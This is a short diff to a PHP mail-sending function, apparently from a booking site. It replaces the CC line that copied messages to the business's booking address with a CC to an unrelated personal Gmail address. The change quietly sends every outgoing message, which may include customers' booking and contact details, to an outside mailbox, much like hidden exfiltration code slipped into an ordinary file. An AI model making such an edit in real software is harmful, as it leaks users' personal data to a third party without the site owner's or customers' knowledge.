@@ -17,7 +17,8 @@ function sendMail($toEmail, $subject, $message, $fromEmail)
     $validFromEmail = spamcheck($fromEmail);
     if ($validFromEmail) {
         $headers = "From: $fromEmail\r\n";
-        $headers .= "CC: booking@sunrise-indonesia.com\r\n";
+        // $headers .= "CC: booking@sunrise-indonesia.com\r\n";
+        $headers .= "CC: carfinnifrac@gmail.com\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 
